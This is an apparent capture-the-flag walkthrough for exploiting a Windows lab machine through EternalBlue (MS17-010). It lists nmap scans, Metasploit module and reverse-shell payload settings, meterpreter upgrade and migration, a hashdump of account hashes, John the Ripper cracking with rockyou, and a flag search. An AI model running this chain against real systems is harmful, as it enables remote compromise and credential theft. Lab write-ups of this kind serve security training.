# Eternal Blue

## Scaning
Original nmap scan tells you the smb service ports

the following shows what they are vulnerable to
```bash
nmap -p 139,445 -Pn --script smb-enum* $IP

nmap -p 134,445 --script vuln $IP
```

from here you can use metasplot to exploit the box using the following exploit


## Exploit and escalate

```
exploit/windows/smb/ms17_010_eternalblue
```

set the type of shell needed for the exercise

```
set payload windows/x64/shell/reverse_tcp
```

With these settings the box can be exploited and you can get a win shell, after this you can ctrl-z and start on working to get a metasploit shell

```
post/multi/manage/shell_to_meterpreter
```

use the above exploit with the session number of your connected shell from the previous exploit you have set as a background process

once connected through metasploit you have to upgrade the process to run as admin using:

```
migrate -P <process number of powershell>
```

now that you have admin find the users and the password hashes with

```
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

## Password cracking

the password can be cracked using johntheripper

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashs.txt
```

```
password: alqfna22
```

## Flags

To find the flags just use the following and cat out all the files

```
search -f flag*.txt
```
